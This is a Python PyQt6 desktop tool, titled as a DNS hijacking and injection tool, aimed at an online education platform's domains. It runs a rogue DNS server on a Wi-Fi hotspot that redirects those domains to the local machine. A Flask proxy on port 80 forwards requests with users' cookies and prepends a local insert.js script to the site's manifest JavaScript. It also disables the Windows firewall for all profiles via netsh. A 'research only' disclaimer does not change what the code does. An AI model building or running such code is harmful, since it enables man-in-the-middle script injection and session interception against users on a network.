import sys
import ctypes
import threading
import time
import logging
import signal
import hashlib
import json
from flask_cors import CORS
from PyQt6.QtWidgets import (
    QApplication,
    QMainWindow,
    QWidget,
    QVBoxLayout,
    QHBoxLayout,
    QLabel,
    QPushButton,
    QTextEdit,
    QFrame,
    QMessageBox,
    QProgressDialog,
)
from PyQt6.QtCore import Qt, QThread, pyqtSignal, QDateTime, QObject, QTimer
from PyQt6.QtGui import QFont, QTextCursor, QIcon

# 导入必要模块
import socket
import os
import re
import subprocess
import platform
import ctypes
from datetime import datetime, timedelta
import requests
from flask import Flask, request, Response
from urllib.parse import urljoin
from werkzeug.serving import make_server

def get_wifi_ip():
    try:
        # 创建一个临时socket连接来获取本机IP
        with socket.socket(socket.AF_INET, socket.SOCK_DGRAM) as s:
            # 连接到一个外部地址（不需要实际连接成功）
            s.connect(("8.8.8.8", 80))
            ip_address = s.getsockname()[0]
        return ip_address
    except Exception as e:
        print(f"获取IP地址失败: {e}")
        return None

# 日志重定向类 - 添加线程锁
class QTextEditLogger(logging.Handler, QObject):
    log_signal = pyqtSignal(str)
    # 添加线程锁防止并发写入
    log_lock = threading.Lock()

    def __init__(self):
        super().__init__()
        QObject.__init__(self)

    def emit(self, record):
        with self.log_lock:  # 确保日志日志记录操作的原子性
            msg = self.format(record)
            self.log_signal.emit(msg)


# 原功能函数保持不变
def extract_manifest_path(url):
    try:
        response = requests.get(url, timeout=10)
        response.raise_for_status()

        pattern = r'src="[^"]*manifest\.build\.[^"]+\.js"'
        match = re.search(pattern, response.text)

        if match:
            full_match = match.group()
            path = full_match[5:-1]
            static_index = path.find("/static")
            if static_index != -1:
                path = path[static_index:]
            return path
        else:
            return "未找到manifest.build路径"

    except requests.exceptions.RequestException as e:
        return f"请求出错: {str(e)}"
    except Exception as e:
        return f"处理出错: {str(e)}"


TARGET_DOMAIN = "web.alicdn.zykj.org"
TARGET_DOMAIN_2 = "sxz.school.zykj.org"
TARGET_DOMAINS = [TARGET_DOMAIN, TARGET_DOMAIN_2,"web-alicdn.zyai.cc"]
HOTSPOT_IP = ""
REMOTE_BASE_URL = "http://web.alicdn.zykj.org"
INSERT_JS_PATH = "insert.js"


def get_hotspot_ip():
    try:
        result = subprocess.check_output(
            "ipconfig" if platform.system() == "Windows" else "ifconfig",
            text=True,
            encoding=("gbk" if platform.system() == "Windows" else "utf-8"),
        )
        patterns = [
            r"IPv4 Address[^\d]+(\d+\.\d+\.\d+\.\d+)",
            r"IPv4 地址[^\d]+(\d+\.\d+\.\d+\.\d+)",
            r"inet (\d+\.\d+\.\d+\.\d+).*(?:ap|hotspot)",
            r"inet (\d+\.\d+\.\d+\.\d+).*192\\.168\\.(?:137|43|44)",
        ]
        for pattern in patterns:
            for ip in re.findall(pattern, result, re.IGNORECASE):
                if ip.startswith(("192.168.137.", "192.168.43.", "172.20.10.")):
                    return ip
        ip_matches = re.findall(r"\d+\.\d+\.\d+\.\d+", result)
        for ip in ip_matches:
            if ip.startswith(("192.168.", "172.16.", "10.")) and ip != "127.0.0.1":
                return ip
        return "192.168.137.1"
    except Exception as e:
        return f"自动获取IP失败: {e}"


# 添加IP获取线程类
class GetHotspotIpThread(QThread):
    ip_fetched = pyqtSignal(str)  # 用于传递获取到的IP信号
    
    def run(self):
        # 在子线程中获取IP
        ip = get_hotspot_ip()
        # 发送信号传递结果
        self.ip_fetched.emit(ip)


def is_admin_windows():
    try:
        return ctypes.windll.shell32.IsUserAnAdmin() != 0
    except:
        return False


def disable_firewall():
    if platform.system() == "Windows":
        os.system("netsh advfirewall set allprofiles state off 2>nul")
        os.system(
            'netsh advfirewall firewall add rule name="Allow53" dir=in action=allow protocol=UDP localport=53'
        )
    else:
        return "非Windows系统，请手动配置防火墙允许53(UDP)和80(TCP)端口"


def get_timestamp():
    return datetime.now().strftime("%H:%M:%S")


class DNSQuery:
    def __init__(self, data):
        self.data = data
        self.domain = ""
        tipo = (data[2] >> 3) & 15
        if tipo == 0:
            ini = 12
            lon = data[ini]
            while lon != 0:
                self.domain += (
                    data[ini + 1 : ini + lon + 1].decode("utf-8", errors="ignore") + "."
                )
                ini += lon + 1
                lon = data[ini]

    def build_response(self, ip):
        packet = self.data[:2]
        packet += b"\x85\x80"
        packet += self.data[4:6]
        packet += self.data[4:6]
        packet += b"\x00\x00\x00\x00"
        packet += self.data[12:]
        packet += b"\xc0\x0c"
        packet += b"\x00\x01"
        packet += b"\x00\x01"
        packet += b"\x00\x00\x00\x05"
        packet += b"\x00\x04"
        packet += bytes(map(int, ip.split(".")))
        return packet


class DNSThread(QThread):
    log_signal = pyqtSignal(str)
    status_signal = pyqtSignal(bool)
    # 添加线程锁
    log_lock = threading.Lock()

    def __init__(self, hotspot_ip, target_domains):
        super().__init__()
        self.hotspot_ip = hotspot_ip
        self.target_domains = target_domains
        self.running = False
        self.sock = None

    def run(self):
        self.running = True
        try:
            self.sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            self.sock.bind((self.hotspot_ip, 53))
            self.sock.settimeout(2)
            self.log_signal.emit(f"DNS 服务已启动，绑定 {self.hotspot_ip}:53")
            self.status_signal.emit(True)

            while self.running:
                try:
                    data, addr = self.sock.recvfrom(1024)
                    query = DNSQuery(data)
                    domain = query.domain.strip(".").lower()
                    print(domain)
                    if domain in self.target_domains:
                        response = query.build_response(self.hotspot_ip)
                        self.sock.sendto(response, addr)
                        with self.log_lock:  # 日志发送加锁
                            self.log_signal.emit(
                                f"[DNS] {addr[0]} -> {query.domain} (劫持到 {self.hotspot_ip})"
                            )
                    else:
                        for dns in [("223.5.5.5", 53), ("1.1.1.1", 53)]:
                            try:
                                s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
                                s.settimeout(1.5)
                                s.sendto(data, dns)
                                resp, _ = s.recvfrom(1024)
                                self.sock.sendto(resp, addr)
                                s.close()
                                break
                            except:
                                pass
                except socket.timeout:
                    continue
                except Exception as e:
                    with self.log_lock:  # 日志发送加锁
                        self.log_signal.emit(f"[!] DNS错误: {e}")
        except OSError as e:
            with self.log_lock:  # 日志发送加锁
                self.log_signal.emit(f"[!] DNS 绑定失败: {e}")
            self.status_signal.emit(False)
        finally:
            if self.sock:
                self.sock.close()  # 确保socket关闭
            self.status_signal.emit(False)
            with self.log_lock:  # 日志发送加锁
                self.log_signal.emit("[!] DNS 服务已停止")

    def stop(self):
        self.running = False
        # 主动关闭socket以唤醒recvfrom阻塞
        if self.sock:
            try:
                self.sock.close()
            except:
                pass
        # 等待线程结束，但设置超时
        if not self.wait(2000):  # 2秒超时
            with self.log_lock:  # 日志发送加锁
                self.log_signal.emit("[!] DNS线程无法无法正常终止，强制结束")


# 改进的HTTP服务线程，使用可控制的服务器
class FlaskServer(QObject):
    def __init__(self, app, host, port):
        super().__init__()
        self.server = make_server(host, port, app)
        self.ctx = app.app_context()
        self.ctx.push()
        self.running = False

    def run(self):
        self.running = True
        self.server.serve_forever()

    def shutdown(self):
        if self.running:
            self.server.shutdown()
            self.running = False


class HTTPThread(QThread):
    log_signal = pyqtSignal(str)
    status_signal = pyqtSignal(bool)
    # 添加线程锁
    log_lock = threading.Lock()

    def __init__(
        self, hotspot_ip, remote_base_url, manifest_js_path, insert_js_path, log_handler
    ):
        super().__init__()
        self.hotspot_ip = hotspot_ip
        self.remote_base_url = remote_base_url
        self.manifest_js_path = manifest_js_path
        self.insert_js_path = insert_js_path
        self.log_handler = log_handler
        self.running = False
        self.flask_server = None
        self.app = self.create_app()
        self.file_mapping = {}  # URL到文件路径的映射
        self.book_dir = "./book"
    def calculate_md5(self, data):
        """计算数据的MD5哈希值"""
        md5_hash = hashlib.md5()
        md5_hash.update(data.encode('utf-8') if isinstance(data, str) else data)
        return md5_hash.hexdigest()

    def scan_book_files(self):
        """扫描书籍目录下的所有pdf和txt文件"""
        book_files = []
        if not os.path.exists(self.book_dir):
            os.makedirs(self.book_dir)
            return book_files
            
        for filename in os.listdir(self.book_dir):
            file_path = os.path.join(self.book_dir, filename)
            if os.path.isfile(file_path):
                ext = os.path.splitext(filename)[1].lower()
                if ext in ['.pdf', '.txt']:
                    book_files.append((filename, file_path))
        return book_files

    def generate_book_index(self):
        """生成书籍索引数据和URL映射"""
        book_files = self.scan_book_files()
        index_data = []
        self.file_mapping = {}  # 清空现有映射
        timestamp = str(time.time())  # 当前UNIX时间戳
        
        for filename, file_path in book_files:
            name = os.path.splitext(filename)[0]
            filename_md5 = self.calculate_md5(filename)
            
            # 计算文件内容MD5
            try:
                with open(file_path, 'rb') as f:
                    file_md5 = self.calculate_md5(f.read())
            except Exception as e:
                error_msg = f"[!] 计算文件MD5错误 {filename}: {str(e)}"
                with self.log_lock:
                    self.log_signal.emit(error_msg)
                continue
            
            ext = os.path.splitext(filename)[1][1:].lower()
            special_filename = f"{timestamp}.{filename_md5}.{file_md5}.{ext}"
            url = f"/i_book/res/{special_filename}"
            
            self.file_mapping[special_filename] = file_path
            index_data.append({"name": name, "url": url})
        
        return index_data
    def get_cache_headers(self):
        expires = (datetime.utcnow() + timedelta(days=365)).strftime(
            "%a, %d %b %Y %H:%M:%S GMT"
        )
        return {"Cache-Control": "public, max-age=31536000", "Expires": expires}

    def create_app(self):
        app = Flask(__name__, static_folder="i_res")
        app.config['SEND_FILE_MAX_AGE_DEFAULT']=timedelta(days=365)#
        
        CORS(app, resources={r"/*": {"origins": "*"}})

        # 配置Flask日志
        app.logger.setLevel(logging.INFO)
        app.logger.addHandler(self.log_handler)
        @app.route("/navPage.html", methods=["GET", "POST", "PUT", "DELETE"])
        def proxy_nav():
            remote_url = urljoin("http://sxz.school.zykj.org","navPage.html")
            try:
                app.logger.info(f"代理请求: {remote_url}")
                resp = requests.request(
                    method=request.method,
                    url=remote_url,
                    headers={
                        key: value
                        for (key, value) in request.headers
                        if key.lower() != "host"
                    },
                    data=request.get_data(),
                    cookies=request.cookies,
                    allow_redirects=False,
                )

                excluded_headers = [
                    "content-encoding",
                    "content-length",
                    "transfer-encoding",
                    "connection",
                ]
                headers = [
                    (name, value)
                    for (name, value) in resp.raw.headers.items()
                    if name.lower() not in excluded_headers
                ]

                headers += list(self.get_cache_headers().items())
                return Response(resp.content, resp.status_code, headers)
            except Exception as e:
                error_msg = f"[!] 代理错误: {str(e)}"
                with self.log_lock:  # 日志发送加锁
                    self.log_signal.emit(error_msg)
                app.logger.error(error_msg)
                return f"Error: {str(e)}", 500

        @app.route("/static/js/manifest.build.<rest>", methods=["GET"])
        def proxy_special_js(rest):
            try:
                remote_url = urljoin(self.remote_base_url, request.path)
                app.logger.info(f"代理请求: {remote_url}")
                response = requests.get(remote_url)
                response.raise_for_status()

                if os.path.exists(self.insert_js_path):
                    with open(self.insert_js_path, "r", encoding="utf-8") as f:
                        insert_content = f.read()
                    modified_content = insert_content + response.text
                else:
                    modified_content = response.text

                headers = {"Content-Type": "application/javascript"}
                headers.update(self.get_cache_headers())
                return Response(modified_content, headers=headers)
            except Exception as e:
                error_msg = f"[!] JS代理错误: {str(e)}"
                with self.log_lock:  # 日志发送加锁
                    self.log_signal.emit(error_msg)
                app.logger.error(error_msg)
                return f"Error: {str(e)}", 500

        @app.route("/<path:path>", methods=["GET", "POST", "PUT", "DELETE"])
        def proxy_all(path):
            remote_url = urljoin(self.remote_base_url, path)
            try:
                app.logger.info(f"代理请求: {remote_url}")
                resp = requests.request(
                    method=request.method,
                    url=remote_url,
                    headers={
                        key: value
                        for (key, value) in request.headers
                        if key.lower() != "host"
                    },
                    data=request.get_data(),
                    cookies=request.cookies,
                    allow_redirects=False,
                )

                excluded_headers = [
                    "content-encoding",
                    "content-length",
                    "transfer-encoding",
                    "connection",
                ]
                headers = [
                    (name, value)
                    for (name, value) in resp.raw.headers.items()
                    if name.lower() not in excluded_headers
                ]

                headers += list(self.get_cache_headers().items())
                return Response(resp.content, resp.status_code, headers)
            except Exception as e:
                error_msg = f"[!] 代理错误: {str(e)}"
                with self.log_lock:  # 日志发送加锁
                    self.log_signal.emit(error_msg)
                app.logger.error(error_msg)
                return f"Error: {str(e)}", 500

        @app.route("/", methods=["GET", "POST", "PUT", "DELETE"])
        def proxyxy_root():
            return proxy_all("")
        @app.route("/i_book/index/<path:anything>", methods=["GET"])
        def book_index(anything):
            try:
                app.logger.info(f"处理书籍索引请求: /i_book/index/{anything}")
                index_data = self.generate_book_index()
                return Response(
                    json.dumps(index_data, ensure_ascii=False, indent=2),
                    mimetype="application/json",
                    headers={"Cache-Control": "no-cache"}
                )
            except Exception as e:
                error_msg = f"[!] 书籍索引错误: {str(e)}"
                with self.log_lock:
                    self.log_signal.emit(error_msg)
                app.logger.error(error_msg)
                return f"Error: {str(e)}", 500

        @app.route("/i_book/res/<path:filename>", methods=["GET"])
        def book_file(filename):
            try:
                app.logger.info(f"处理书籍文件请求: /i_book/res/{filename}")
                if filename not in self.file_mapping:
                    return "File not found", 404
                
                file_path = self.file_mapping[filename]
                ext = os.path.splitext(filename)[1].lower()
                mimetype = 'application/pdf' if ext == '.pdf' else 'text/plain; charset=utf-8'
                
                with open(file_path, 'rb') as f:
                    content = f.read()
                
                headers = {"Content-Type": mimetype}
                headers.update(self.get_cache_headers())
                return Response(content, headers=headers)
            except Exception as e:
                error_msg = f"[!] 书籍文件访问错误: {str(e)}"
                with self.log_lock:
                    self.log_signal.emit(error_msg)
                app.logger.error(error_msg)
                return f"Error: {str(e)}", 500



        return app

    def run(self):
        self.running = True
        try:
            # 使用werkzeug的make_server创建可控制的服务器
            self.flask_server = FlaskServer(self.app, "0.0.0.0", 80)
            with self.log_lock:  # 日志发送加锁
                self.log_signal.emit(f" 服务已启动，绑定 0.0.0.0:80")
            self.status_signal.emit(True)
            self.flask_server.run()  # 运行服务器
        except Exception as e:
            error_msg = f"[!] HTTP 启动失败: {e}"
            with self.log_lock:  # 日志发送加锁
                self.log_signal.emit(error_msg)
            self.status_signal.emit(False)
        finally:
            self.status_signal.emit(False)
            with self.log_lock:  # 日志发送加锁
                self.log_signal.emit("[!] HTTP 服务已停止")
            self.running = False

    def stop(self):
        # 优雅关闭Flask服务器
        if self.flask_server:
            try:
                self.flask_server.shutdown()
                with self.log_lock:  # 日志发送加锁
                    self.log_signal.emit("[*] 正在关闭HTTP服务...")
            except Exception as e:
                with self.log_lock:  # 日志发送加锁
                    self.log_signal.emit(f"[!] 关闭HTTP服务出错: {e}")

        # 发送一个请求来唤醒阻塞的服务器
        try:
            requests.get(f"http://127.0.0.1:80/_shutdown", timeout=1)
        except:
            pass

        # 确保线程终止，设置超时
        self.running = False
        if not self.wait(2000):  # 2秒超时
            with self.log_lock:  # 日志发送加锁
                self.log_signal.emit("[!] HTTP线程无法正常终止，强制结束")


class CloseServiceThread(QThread):
    """单独的线程用于关闭服务，避免阻塞UI"""

    finished = pyqtSignal()
    log_signal = pyqtSignal(str)
    # 添加线程锁
    log_lock = threading.Lock()

    def __init__(self, http_thread, dns_thread):
        super().__init__()
        self.http_thread = http_thread
        self.dns_thread = dns_thread

    def run(self):
        # 先停止HTTP服务
        if self.http_thread and self.http_thread.isRunning():
            with self.log_lock:  # 日志发送加锁
                self.log_signal.emit("[*] 开始关闭HTTP服务...")
            self.http_thread.stop()

        # 再停止DNS服务
        if self.dns_thread and self.dns_thread.isRunning():
            with self.log_lock:  # 日志发送加锁
                self.log_signal.emit("[*] 开始关闭DNS服务...")
            self.dns_thread.stop()

        self.finished.emit()


class NetworkToolGUI(QMainWindow):
    def __init__(self):
        super().__init__()
        self.dns_thread = None
        self.http_thread = None
        self.services_running = False
        self.close_in_progress = False  # 标记关闭过程是否正在进行
        # 添加日志写入锁
        self.log_write_lock = threading.Lock()

        # 初始化日志重定向器
        self.init_logger()
        self.init_ui()
        self.set_window_icon()
        
        # 异步获取热点IP
        self.fetch_hotspot_ip_async()

    def fetch_hotspot_ip_async(self):
        """异步获取热点IP"""
        self.append_log("正在获取热点IP，请稍候...")
        self.ip_thread = GetHotspotIpThread()
        self.ip_thread.ip_fetched.connect(self.on_ip_fetched)
        self.ip_thread.start()

    def on_ip_fetched(self, ip):
        """处理获取到的IP"""
        global HOTSPOT_IP
        HOTSPOT_IP = ip
        self.append_log(f"热点IP: {HOTSPOT_IP}")

    def set_window_icon(self):
        """设置窗口图标"""
        try:
            # 请将"proxy_icon.ico"替换为你的图标文件路径
            icon = QIcon("icon.ico")

            # 如果图标加载成功，则设置
            if not icon.isNull():
                self.setWindowIcon(icon)
            else:
                self.append_log("警告：无法加载图标文件")
        except Exception as e:
            self.append_log(f"设置图标时出错: {str(e)}")

    def init_logger(self):
        self.log_handler = QTextEditLogger()
        self.log_handler.setFormatter(
            logging.Formatter("[HTTP] %(message)s", datefmt="%H:%M:%S")
        )
        self.log_handler.log_signal.connect(self.append_flask_log)
    
    def open_dir(self):
        # 获取当前目录下book文件夹的绝对路径
        folder_path = os.path.abspath("./book")
        
        # 检查目录是否存在
        if not os.path.exists(folder_path):
            print(f"错误: 目录 '{folder_path}' 不存在")
            return
        
        try:
            if sys.platform.startswith('win32'):
                # Windows系统使用资源管理器
                os.startfile(folder_path)
            elif sys.platform.startswith('darwin'):
                # macOS系统使用Finder
                subprocess.run(['open', folder_path])
                print("见鬼了")
            else:
                # Linux系统使用xdg-open
                subprocess.run(['xdg-open', folder_path])
                print("也见鬼了")
            
            print(f"已打开目录: {folder_path}")
        except Exception as e:
            print(f"打开目录失败: {e}")
    def show_about_info(self):
        QMessageBox.about(
            self, 
            "关于", 
            "作者：75F0E246F4CE4770\n"+\
            "版本：1.1.0\n"+\
            "https://bbs.metasxz.org"
        )

    def init_ui(self):
        self.setWindowTitle("在线专栏DNS劫持注入工具")
        self.setGeometry(100, 100, 800, 600)

        central_widget = QWidget()
        self.setCentralWidget(central_widget)
        main_layout = QVBoxLayout(central_widget)

        # 标题
        title_label = QLabel("在线专栏DNS劫持注入工具")
        title_font = QFont("SimHei", 16, QFont.Weight.Bold)
        title_label.setFont(title_font)
        title_label.setAlignment(Qt.AlignmentFlag.AlignCenter)
        title_label.setStyleSheet("margin: 10px 0px;")
        main_layout.addWidget(title_label)

        # 分隔线
        line = QFrame()
        line.setFrameShape(QFrame.Shape.HLine)
        line.setFrameShadow(QFrame.Shadow.Sunken)
        main_layout.addWidget(line)

        # 状态区域
        status_layout = QVBoxLayout()
        status_group = QWidget()
        status_group.setLayout(status_layout)
        status_group.setStyleSheet(
            "border: 1px solid #ccc; border-radius: 5px; padding: 10px; margin: 5px 0px;"
        )

        # DNS状态
        dns_layout = QHBoxLayout()
        dns_label = QLabel("DNS状态: ")
        dns_label.setFont(QFont("SimHei", 12))
        self.dns_status = QLabel("未运行")
        self.dns_status.setFont(QFont("SimHei", 12))
        self.dns_status.setStyleSheet("color: red;")
        dns_layout.addWidget(dns_label)
        dns_layout.addWidget(self.dns_status)
        dns_layout.addStretch()
        status_layout.addLayout(dns_layout)

        # HTTP状态
        http_layout = QHBoxLayout()
        http_label = QLabel("HTTP状态: ")
        http_label.setFont(QFont("SimHei", 12))
        self.http_status = QLabel("未运行")
        self.http_status.setFont(QFont("SimHei", 12))
        self.http_status.setStyleSheet("color: red;")
        http_layout.addWidget(http_label)
        http_layout.addWidget(self.http_status)
        http_layout.addStretch()
        status_layout.addLayout(http_layout)
        
        # IP状态
        ip_layout = QHBoxLayout()
        ip_label = QLabel("本机IP: ")
        ip_label.setFont(QFont("SimHei", 12))
        self.ip_status = QLabel(get_wifi_ip())
        self.ip_status.setFont(QFont("SimHei", 12))
        ip_layout.addWidget(ip_label)
        ip_layout.addWidget(self.ip_status)
        ip_layout.addStretch()
        status_layout.addLayout(ip_layout)
        
        
        # IP状态
        tip_layout = QHBoxLayout()
        tip_label = QLabel("本程序为安装程序")
        tip_label.setFont(QFont("SimHei", 12))
        tip_layout.addWidget(tip_label)
        tip_layout.addStretch()
        status_layout.addLayout(tip_layout)

        # 控制按钮
        btn_layout = QHBoxLayout()
        self.control_btn = QPushButton("开启")
        self.control_btn.setFont(QFont("SimHei", 12))
        self.control_btn.setStyleSheet(
            "padding: 8px 16px; background-color: #4CAF50; color: white; border-radius: 4px;"
        )
        self.control_btn.clicked.connect(self.toggle_services)
        btn_layout.addWidget(self.control_btn)
        
        # book按钮
        
        
        # readme按钮
        self.readme_btn = QPushButton("阅读说明")
        self.readme_btn.setFont(QFont("SimHei", 12))
        self.readme_btn.setStyleSheet(
            "padding: 8px 16px; background-color: #6082B6; color: white; border-radius: 4px;"
        )
        self.readme_btn.clicked.connect(self.open_readme_pdf)
        btn_layout.addWidget(self.readme_btn)
        
        # 在你的界面初始化函数中添加以下代码
        self.about_btn = QPushButton("关于")
        self.about_btn.setFont(QFont("SimHei", 12))
        self.about_btn.setStyleSheet(
            "padding: 8px 16px; background-color: #C3B1E1; color: white; border-radius: 4px;"
        )
        self.about_btn.clicked.connect(self.show_about_info)
        btn_layout.addWidget(self.about_btn)  # 添加到同一个按钮布局中
        
        btn_layout.addStretch()
        
        
        status_layout.addLayout(btn_layout)

        main_layout.addWidget(status_group)

        # 分隔线
        line2 = QFrame()
        line2.setFrameShape(QFrame.Shape.HLine)
        line2.setFrameShadow(QFrame.Shadow.Sunken)
        main_layout.addWidget(line2)

        # 日志区域
        log_label = QLabel("日志:")
        log_label.setFont(QFont("SimHei", 12))
        main_layout.addWidget(log_label)

        self.log_text = QTextEdit()
        self.log_text.setFont(QFont("SimHei", 10))
        self.log_text.setReadOnly(True)
        self.log_text.setStyleSheet(
            "border: 1px solid #ccc; border-radius: 5px; padding: 5px;"
        )
        main_layout.addWidget(self.log_text)

        # 初始化信息
        self.append_log("程序已启动，等待用户操作...")
        self.append_log(f"目标劫持域名: {TARGET_DOMAIN}")
        self.append_log(f"代理目标: {REMOTE_BASE_URL}")

    def append_log(self, text):
        # 日志写入加锁，确保线程安全
        with self.log_write_lock:
            timestamp = QDateTime.currentDateTime().toString("HH:mm:ss")
            log_entry = f"{text}\n"

            # 强制移动光标到文档末尾
            cursor = self.log_text.textCursor()
            cursor.movePosition(QTextCursor.MoveOperation.End)
            self.log_text.setTextCursor(cursor)

            # 在末尾插入新日志
            self.log_text.insertPlainText(log_entry)

            # 再次确保光标在末尾
            cursor.movePosition(QTextCursor.MoveOperation.End)
            self.log_text.setTextCursor(cursor)

    def append_flask_log(self, text):
        # 日志写入加锁，确保线程安全
        with self.log_write_lock:
            log_entry = f"{text}\n"

            # 强制移动光标到文档末尾
            cursor = self.log_text.textCursor()
            cursor.movePosition(QTextCursor.MoveOperation.End)
            self.log_text.setTextCursor(cursor)

            # 在末尾插入新日志
            cursor.insertText(log_entry)

            # 再次确保光标在末尾
            cursor.movePosition(QTextCursor.MoveOperation.End)
            self.log_text.setTextCursor(cursor)
    def open_readme_pdf(self):
        # 定义PDF文件路径
        pdf_path = os.path.abspath("./README.pdf")
        
        # 检查文件是否存在
        if not os.path.exists(pdf_path):
            print(f"错误: 文件 '{pdf_path}' 不存在")
            return
        
        try:
            # Windows系统: 使用ShellExecute打开文件（更底层的方法）
            # 返回值大于32表示成功
            result = ctypes.windll.shell32.ShellExecuteW(
                None, "open", pdf_path, None, None, 1  # 1表示正常显示窗口
            )
            
            if result <= 32:
                raise Exception(f"打开失败，错误代码: {result}")
                
            print(f"已用默认程序打开: {pdf_path}")
        except Exception as e:
            print(f"打开文件失败: {e}")

    def update_dns_status(self, running):
        if running:
            self.dns_status.setText("运行中")
            self.dns_status.setStyleSheet("color: green;")
        else:
            self.dns_status.setText("已停止")
            self.dns_status.setStyleSheet("color: red;")

    def update_http_status(self, running):
        if running:
            self.http_status.setText("运行中")
            self.http_status.setStyleSheet("color: green;")
        else:
            self.http_status.setText("已停止")
            self.http_status.setStyleSheet("color: red;")

    def toggle_services(self):
        if self.close_in_progress or self.services_running:
            return  # 如果正在关闭或已启动，则不执行操作

        # 检查IP是否已获取
        if not HOTSPOT_IP or HOTSPOT_IP.startswith("自动获取IP失败"):
            QMessageBox.warning(self, "IP获取失败", "无法获取热点IP，请检查网络设置后重试")
            return

        self.start_services()

    def start_services(self):
        # 检查管理员权限
        if platform.system() == "Windows" and not is_admin_windows():
            QMessageBox.warning(
                self, "权限不足", "请以管理员身份运行程序，否则服务可能无法正常启动！"
            )

        # 配置防火墙
        self.append_log("正在配置防火墙...")
        firewall_msg = disable_firewall()
        if firewall_msg:
            self.append_log(firewall_msg)
        else:
            self.append_log("防火墙配置完成")

        # 启动DNS服务
        self.dns_thread = DNSThread(HOTSPOT_IP, TARGET_DOMAINS)
        self.dns_thread.log_signal.connect(self.append_log)
        self.dns_thread.status_signal.connect(self.update_dns_status)
        self.dns_thread.start()

        # 启动HTTP服务
        self.http_thread = HTTPThread(
            HOTSPOT_IP,
            REMOTE_BASE_URL,
            "",
            INSERT_JS_PATH,
            self.log_handler,
        )
        self.http_thread.log_signal.connect(self.append_log)
        self.http_thread.status_signal.connect(self.update_http_status)
        self.http_thread.start()

        # 更新状态 - 按钮显示"已启动"并禁用
        self.services_running = True
        self.control_btn.setText("已启动")
        self.control_btn.setStyleSheet(
            "padding: 8px 16px; background-color: #cccccc; color: #666666; border-radius: 4px;"
        )
        self.control_btn.setEnabled(False)
        self.append_log("服务启动中...")

        # 检测设备连接
        threading.Thread(target=self.check_devices, daemon=True).start()

    def stop_services(self):
        if self.close_in_progress:
            return

        self.close_in_progress = True

        # 创建并启动关闭服务的线程
        self.close_thread = CloseServiceThread(self.http_thread, self.dns_thread)
        self.close_thread.log_signal.connect(self.append_log)
        self.close_thread.finished.connect(self.on_close_finished)
        self.close_thread.start()

    def on_close_finished(self):
        """关闭完成后的处理"""
        self.services_running = False
        self.close_in_progress = False
        self.append_log("所有服务已停止")

    def check_devices(self):
        time.sleep(2)
        self.append_log("\n正在检测连接的设备...")
        try:
            if platform.system() == "Windows":
                result = subprocess.check_output(
                    "arp -a", shell=True, text=True, encoding="gbk"
                )
                devices = re.findall(r"(\d+\.\d+\.\d+\.\d+)\s+[0-9a-f-]{17}", result)
                hotspot_prefix = HOTSPOT_IP.rsplit(".", 1)[0] + "."
                hotspot_devices = [
                    ip for ip in devices if ip.startswith(hotspot_prefix)
                ]

                if hotspot_devices:
                    self.append_log(f"检测到 {len(hotspot_devices)} 台设备连接到热点:")
                    for ip in hotspot_devices:
                        self.append_log(f"  - {ip}")
                else:
                    self.append_log("未检测到任何设备连接到热点")
            else:
                self.append_log("设备检测功能仅支持Windows系统")
        except Exception as e:
            self.append_log(f"设备检测失败: {e}")

    def closeEvent(self, event):
        """窗口关闭时直接退出，服务会自动结束"""
        if self.services_running:
            # 启动服务关闭线程，但不阻塞等待
            self.stop_services()

        # 直接接受关闭事件，不做额外确认
        event.accept()


if __name__ == "__main__":
    # 处理系统信号，确保程序可以被终止
    def handle_signal(signum, frame):
        sys.exit(0)

    signal.signal(signal.SIGINT, handle_signal)
    signal.signal(signal.SIGTERM, handle_signal)

    app = QApplication(sys.argv)

    # 确保中文显示正常
    font = QFont("SimHei")
    app.setFont(font)

    # 显示免责声明
    msg_box = QMessageBox()
    msg_box.setWindowTitle("免责声明")
    msg_icon = QIcon("icon.ico")
    msg_box.setWindowIcon(msg_icon)
    msg_box.setText(
        """
***********************************免责声明***********************************
                             本工具仅作为技术研究                             
                             切勿应用于违法场景中!                            
                   下载本工具者应于下载后24小时内删除本工具                    
                           任何法律责任与作者无关！                            
******************************************************************************
    """
    )
    msg_box.setStandardButtons(QMessageBox.StandardButton.Ok)
    msg_box.exec()

    window = NetworkToolGUI()
    window.show()
    sys.exit(app.exec())